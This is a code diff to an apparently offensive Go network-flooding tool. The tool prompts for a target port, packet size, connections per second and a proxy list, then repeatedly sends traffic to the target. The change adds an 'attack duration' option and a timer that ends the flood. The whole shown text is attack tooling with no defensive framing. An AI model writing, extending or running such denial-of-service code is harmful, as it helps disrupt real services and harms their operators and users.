@@ -45,12 +45,14 @@ func main() {
 	InpPacketS := askInput("Packet size (bytes)", "2469")
 	InpPPS := askInput("Packets per connection", "1000")
 	InpBots := askInput("Proxy file path", "working.txt")
+	InpDuration := askInput("Attack duration (seconds, 0 for unlimited)", "0")
 
 	port, _ := strconv.Atoi(InpPortStr)
 	rps, _ := strconv.Atoi(InpConStr)
 	timeoutSec, _ := strconv.Atoi(InpTimeoutStr)
 	packetSize, _ := strconv.Atoi(InpPacketS)
 	packetsPerConn, _ := strconv.Atoi(InpPPS)
+	durationSec, _ := strconv.Atoi(InpDuration)
 	timeout := time.Duration(timeoutSec) * time.Second
 
 	addr := fmt.Sprintf("%s:%d", target, port)
@@ -89,10 +91,18 @@ func main() {
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
 
+	var durationStop <-chan time.Time
+	if durationSec > 0 {
+		durationStop = time.After(time.Duration(durationSec) * time.Second)
+	}
+
 	for {
 		select {
 		case <-stop:
 			fmt.Println("\nStopped by user.")
+			return
+		case <-durationStop:
+			fmt.Println("\nStopped after duration elapsed.")
 			return
 		case <-ticker.C:
 			go func() {
